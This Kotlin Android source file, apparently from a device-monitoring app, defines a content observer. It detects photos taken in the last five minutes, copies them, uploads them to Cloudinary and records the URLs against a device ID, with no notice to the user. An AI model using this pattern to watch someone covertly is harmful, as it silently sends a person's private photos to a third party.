package com.devicemonitor.observer

import android.Manifest
import android.content.ContentResolver
import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import androidx.core.content.ContextCompat
import com.devicemonitor.data.models.Photo
import com.devicemonitor.data.repository.DeviceRepository
import com.devicemonitor.utils.Constants
import com.devicemonitor.utils.PhotoHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class PhotoContentObserver(
    private val context: Context,
    handler: Handler,
    private val repository: DeviceRepository
) : ContentObserver(handler) {

    private val TAG = "PhotoContentObserver"
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val processedPhotoIds = mutableSetOf<Long>()

    override fun onChange(selfChange: Boolean, uri: Uri?) {
        super.onChange(selfChange, uri)
        Log.d(TAG, "Photo content changed: $uri")

        if (ContextCompat.checkSelfPermission(
                context,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    Manifest.permission.READ_MEDIA_IMAGES
                } else {
                    Manifest.permission.READ_EXTERNAL_STORAGE
                }
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.w(TAG, "Storage permissions not granted")
            return
        }

        checkNewPhotos()
    }

    fun checkNewPhotos() {
        val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_TAKEN
        )

        val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"

        context.contentResolver.query(
            collection,
            projection,
            null,
            null,
            sortOrder
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val dateTakenColumn =
                cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)

            while (cursor.moveToNext()) {
                val photoId = cursor.getLong(idColumn)

                if (!processedPhotoIds.contains(photoId)) {
                    processedPhotoIds.add(photoId)

                    // Only process photos taken in last 5 minutes
                    val dateTaken = cursor.getLong(dateTakenColumn)
                    val fiveMinutesAgo = System.currentTimeMillis() - 5 * 60 * 1000

                    if (dateTaken > fiveMinutesAgo) {
                        Log.d(TAG, "New photo detected: $photoId")
                        processNewPhoto(photoId)
                    }

                    // Keep the set size manageable
                    if (processedPhotoIds.size > 1000) {
                        processedPhotoIds.clear()
                    }
                }
            }
        }
    }

    private fun processNewPhoto(photoId: Long) {
        serviceScope.launch {
            try {
                val photoUri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    photoId
                )

                // Copy photo to app's private storage
                val inputStream = context.contentResolver.openInputStream(photoUri)
                val photoFile = PhotoHelper.createImageFile(context) ?: return@launch
                inputStream?.use { input ->
                    photoFile.outputStream().use { output ->
                        input.copyTo(output)
                    }
                }

                // Upload to Cloudinary
                val photoUrl = PhotoHelper.uploadToCloudinary(photoFile)
                if (photoUrl != null) {
                    val photoEntry = Photo(
                        device_id = Constants.getDeviceId(context),
                        photo_url = photoUrl,
                        recorded_at = SimpleDateFormat(
                            "yyyy-MM-dd'T'HH:mm:ss'Z'",
                            Locale.getDefault()
                        ).format(Date())
                    )
                    repository.insertPhoto(photoEntry)
                    Log.d(TAG, "Photo uploaded successfully: $photoUrl")
                }

                // Delete the temporary file
                if (photoFile.exists()) {
                    photoFile.delete()
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error processing new photo", e)
            }
        }
    }
}
